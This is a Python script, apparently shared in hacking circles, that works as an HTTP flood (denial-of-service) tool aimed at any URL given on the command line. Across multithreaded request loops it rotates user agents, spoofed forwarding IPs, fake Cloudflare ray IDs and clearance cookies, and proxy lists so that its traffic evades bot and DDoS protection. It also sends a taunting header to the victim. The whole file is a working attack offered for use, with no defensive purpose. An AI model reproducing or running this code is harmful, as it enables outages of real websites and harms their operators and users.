"""
NEW HEADER HTTP2 HTTP1 FOR MIX PROTOCOL - PYTHON VERSION
Copyright (c) 2026 t.me/xxiinn - Converted by ZANGXX VVIP
File: h2.py
"""

import random
import string
import time
import requests
import sys
import threading
import os
from typing import Dict, Optional, Tuple
import json
from urllib.parse import urlparse

class HeaderConfig:
    def __init__(self):
        self.accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
        self.accept_encoding = "gzip, br"
        self.accept_language = "id-ID,id;q=0.9,en;q=0.8"
        self.cache_control = "max-age=0"
        self.connection = "keep-alive"
        self.priority = "u=0, i"
        self.referer = "https://example.com/"
        self.sec_ch_ua = ""
        self.sec_ch_ua_arch = "x86"
        self.sec_ch_ua_bitness = "64"
        self.sec_ch_ua_full_version_list = ""
        self.sec_ch_ua_mobile = "?0"
        self.sec_ch_ua_model = ""
        self.sec_ch_ua_platform = "Windows"
        self.sec_ch_ua_platform_version = "15.0.0"
        self.sec_fetch_dest = "document"
        self.sec_fetch_mode = "navigate"
        self.sec_fetch_site = "cross-site"
        self.sec_fetch_user = "?1"
        self.sec_gpc = "1"
        self.upgrade_insecure_requests = "1"
        self.user_agent = ""
        self.x_forwarded_for = ""
        self.x_forwarded_proto = "https"
        self.cookie = ""
        self.cf_ray = ""
        self.cf_visitor = ""
        self.cf_connecting_ip = ""
        self.x_ssl_id = ""
        self.origin = ""
        self.cf_ip_country = ""
        self.unique = 0

    def build_headers(self) -> Dict[str, str]:
        headers = {
            "Accept": self.accept,
            "Accept-Encoding": self.accept_encoding,
            "Accept-Language": self.accept_language,
            "Cache-Control": self.cache_control,
            "Connection": self.connection,
            "Priority": self.priority,
            "Referer": self.referer,
            "Sec-Ch-Ua": self.sec_ch_ua,
            "Sec-Ch-Ua-Arch": self.sec_ch_ua_arch,
            "Sec-Ch-Ua-Bitness": self.sec_ch_ua_bitness,
            "Sec-Ch-Ua-Full-Version-List": self.sec_ch_ua_full_version_list,
            "Sec-Ch-Ua-Mobile": self.sec_ch_ua_mobile,
            "Sec-Ch-Ua-Model": self.sec_ch_ua_model,
            "Sec-Ch-Ua-Platform": self.sec_ch_ua_platform,
            "Sec-Ch-Ua-Platform-Version": self.sec_ch_ua_platform_version,
            "Sec-Fetch-Dest": self.sec_fetch_dest,
            "Sec-Fetch-Mode": self.sec_fetch_mode,
            "Sec-Fetch-Site": self.sec_fetch_site,
            "Sec-Fetch-User": self.sec_fetch_user,
            "Sec-Gpc": self.sec_gpc,
            "Upgrade-Insecure-Requests": self.upgrade_insecure_requests,
            "User-Agent": self.user_agent,
            "X-Forwarded-Proto": self.x_forwarded_proto,
        }
        
        if self.x_forwarded_for:
            headers["X-Forwarded-For"] = self.x_forwarded_for
        if self.cookie:
            headers["Cookie"] = self.cookie
        if self.cf_ray:
            headers["CF-Ray"] = self.cf_ray
        if self.cf_visitor:
            headers["CF-Visitor"] = self.cf_visitor
        if self.cf_connecting_ip:
            headers["Cf-Connecting-Ip"] = self.cf_connecting_ip
        if self.x_ssl_id:
            headers["X-Ssl-Id"] = self.x_ssl_id
        if self.origin:
            headers["Origin"] = self.origin
        if self.cf_ip_country:
            headers["CF-IPCountry"] = self.cf_ip_country
            headers["X-Country"] = self.cf_ip_country
            headers["X-Xcddos-Attack"] = "}⁠:⁠‑⁠)Your protect is verry bad, Just go home and drink your mother's milkO⁠_⁠o"
        
        return headers

    def make_request(self, target_url: str, method: str = "GET", body: bytes = b"", proxy: str = "") -> Tuple[Optional[requests.Response], Optional[Exception]]:
        try:
            proxies = {}
            if proxy:
                proxies = {
                    "http": proxy,
                    "https": proxy
                }
            
            headers = self.build_headers()
            
            response = requests.request(
                method=method,
                url=target_url,
                headers=headers,
                data=body,
                proxies=proxies,
                timeout=5,
                verify=False
            )
            
            return response, None
        except Exception as e:
            return None, e

class Randomizer:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
        ]
        
        self.sec_ch_ua_versions = ["149", "150", "148", "151"]
        
        self.sec_ch_ua_full_versions = [
            '"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"',
            '"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"',
            '"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"',
        ]
        
        self.languages = [
            "id-ID,id;q=0.9,en;q=0.8",
            "en-US,en;q=0.9,id;q=0.8",
            "en-GB,en;q=0.9",
        ]
        
        self.ips = [
            "2a09:bac1:6560:8::279:4e",
            "2a09:bac1:6560:8::279:4f",
            "2a09:bac1:6560:8::280:4e",
            "2a09:bac1:6560:8::280:4f",
        ]
        
        self.cf_ray_prefixes = [
            "8a0a092ad9d940b0",
            "8a0a092ad9d940b1",
            "8a0a092ad9d940b2",
        ]
        
        self.cf_ray_locations = ["SIN", "JAK", "CGK", "LAX", "FRA", "LHR"]
        
        self.origins = [
            "2a09:bac1:6560:8::279:4e",
            "2a09:bac1:6560:8::279:4f",
            "2a09:bac1:6560:8::280:4e",
        ]
        
        self.countries = [
            "ID", "SG", "MY", "PH", "TH", "VN", "CN", "JP", "KR", "IN",
            "PK", "BD", "NP", "LK", "KH", "LA", "MM", "TW", "HK", "MO",
            "GB", "DE", "FR", "IT", "ES", "NL", "SE", "NO", "DK", "FI",
            "PL", "CZ", "HU", "AT", "CH", "BE", "PT", "IE", "GR", "RU",
            "US", "CA", "MX", "BR", "AR", "CL", "CO", "PE", "VE", "EC",
            "BO", "PY", "UY", "CR", "PA", "GT", "HN", "SV", "NI", "DO",
            "ZA", "NG", "EG", "KE", "MA", "DZ", "TN", "GH", "CI", "CM",
            "AU", "NZ", "FJ", "PG", "SB", "VU", "WS", "TO", "FM", "MH",
        ]

    def random_hex(self, n: int) -> str:
        return ''.join(random.choices(string.hexdigits.lower(), k=n))

    def random_int(self, min_val: int, max_val: int) -> int:
        return random.randint(min_val, max_val)

    def generate_cf_ray(self) -> str:
        prefix = random.choice(self.cf_ray_prefixes)
        loc = random.choice(self.cf_ray_locations)
        return f"{prefix}-{loc}"

    def generate_cf_visitor(self) -> str:
        scheme = random.choice(["https", "http"])
        return json.dumps({"scheme": scheme})

    def generate_x_ssl_id(self) -> str:
        ts = int(time.time())
        suffix = self.random_hex(20)
        return f"{ts}-{suffix}"

    def generate_cookie(self) -> str:
        clearance = self.random_hex(32)
        return f"_cf_clearance={clearance}; __cf_bm=...; __cfruid=..."

    def generate_random_ip(self) -> str:
        if random.randint(0, 1) == 0:
            return f"{self.random_int(1,255)}.{self.random_int(0,255)}.{self.random_int(0,255)}.{self.random_int(1,255)}"
        else:
            parts = [self.random_hex(4) for _ in range(8)]
            return ":".join(parts)

    def randomize(self, header: HeaderConfig):
        if self.user_agents:
            header.user_agent = random.choice(self.user_agents)
        
        if self.sec_ch_ua_versions:
            ver = random.choice(self.sec_ch_ua_versions)
            header.sec_ch_ua = f'"Brave";v="{ver}", "Chromium";v="{ver}", "Not?A_Brand";v="24"'
        
        if self.sec_ch_ua_full_versions:
            header.sec_ch_ua_full_version_list = random.choice(self.sec_ch_ua_full_versions)
        
        if self.languages:
            header.accept_language = random.choice(self.languages)
        
        if self.ips:
            header.x_forwarded_for = random.choice(self.ips)
        else:
            header.x_forwarded_for = self.generate_random_ip()
        
        header.cf_ray = self.generate_cf_ray()
        header.cf_visitor = self.generate_cf_visitor()
        header.cf_connecting_ip = self.generate_random_ip()
        header.x_ssl_id = self.generate_x_ssl_id()
        
        if self.origins:
            header.origin = random.choice(self.origins)
        else:
            header.origin = self.generate_random_ip()
        
        header.cookie = self.generate_cookie()
        header.cf_ip_country = random.choice(self.countries)
        header.unique = random.randint(0, 1000000)

# ============================================
# ATTACK ENGINE
# ============================================

class Attack:
    def __init__(self, url: str, duration: int, rate: int, proxies: list):
        self.url = url
        self.duration = duration
        self.rate = rate
        self.proxies = proxies
        self.running = True
        self.success = 0
        self.failed = 0
        self.total = 0
        self.lock = threading.Lock()

    def attack(self):
        randomizer = Randomizer()
        
        while self.running:
            try:
                header = HeaderConfig()
                randomizer.randomize(header)
                
                proxy = None
                if self.proxies:
                    proxy = random.choice(self.proxies)
                
                response, error = header.make_request(self.url, "GET", b"", proxy)
                
                with self.lock:
                    self.total += 1
                    if error:
                        self.failed += 1
                    else:
                        self.success += 1
                        if response:
                            response.close()
                
                # Rate limiting
                time.sleep(1 / self.rate)
                
            except Exception:
                with self.lock:
                    self.total += 1
                    self.failed += 1

    def start(self):
        threads = []
        for _ in range(self.rate):
            if not self.running:
                break
            t = threading.Thread(target=self.attack)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Auto stop after duration
        time.sleep(self.duration)
        self.running = False
        
        for t in threads:
            t.join(timeout=1)

def load_proxies(filename: str) -> list:
    proxies = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    if not line.startswith(('http://', 'https://', 'socks5://')):
                        line = f'http://{line}'
                    proxies.append(line)
    except FileNotFoundError:
        print(f"⚠️ Proxy file {filename} not found!")
    return proxies

def print_banner():
    print("""
    ██╗  ██╗██████╗ 
    ██║  ██║╚════██╗
    ███████║ █████╔╝
    ╚════██║ ╚═══██╗
         ██║██████╔╝
         ╚═╝╚═════╝ 
    ZANGXX VVIP HEADER ATTACK
    """)

def main():
    if len(sys.argv) < 5:
        print("Usage: python3 h2.py <url> <time> <rate> <thread> <proxy_file>")
        print("Example: python3 h2.py https://example.com 120 100 10 proxy.txt")
        sys.exit(1)
    
    url = sys.argv[1]
    duration = int(sys.argv[2])
    rate = int(sys.argv[3])
    thread = int(sys.argv[4])
    proxy_file = sys.argv[5] if len(sys.argv) > 5 else None
    
    proxies = []
    if proxy_file:
        proxies = load_proxies(proxy_file)
        print(f"🔥 Loaded {len(proxies)} proxies")
    
    print_banner()
    print(f"""
    📌 TARGET: {url}
    ⏱️  DURATION: {duration}s
    🚀 RATE: {rate}/s
    🧵 THREADS: {thread}
    🌐 PROXIES: {len(proxies)}
    """)
    
    print("😈 ATTACK STARTED! 🔥")
    
    # Run multiple attack instances based on thread count
    all_success = 0
    all_failed = 0
    all_total = 0
    
    attack_threads = []
    for i in range(thread):
        attack = Attack(url, duration, rate // thread if thread > 0 else rate, proxies)
        t = threading.Thread(target=attack.start)
        t.daemon = True
        t.start()
        attack_threads.append((t, attack))
    
    # Monitor
    start_time = time.time()
    try:
        while time.time() - start_time < duration + 5:
            total_s = 0
            success_s = 0
            failed_s = 0
            
            for _, attack in attack_threads:
                with attack.lock:
                    total_s += attack.total
                    success_s += attack.success
                    failed_s += attack.failed
            
            rps = total_s / (time.time() - start_time) if time.time() - start_time > 0 else 0
            print(f"\r🔥 RPS: {rps:.1f} | ✅ Success: {success_s} | ❌ Failed: {failed_s} | 📊 Total: {total_s}", end="")
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n⚠️ Stopped by user!")
        for t, _ in attack_threads:
            t.join(timeout=1)
    
    print(f"\n\n💀 ATTACK FINISHED!")
    print(f"📊 FINAL STATS:")
    print(f"   ✅ Success: {success_s}")
    print(f"   ❌ Failed: {failed_s}")
    print(f"   📦 Total: {total_s}")

if __name__ == "__main__":
    main()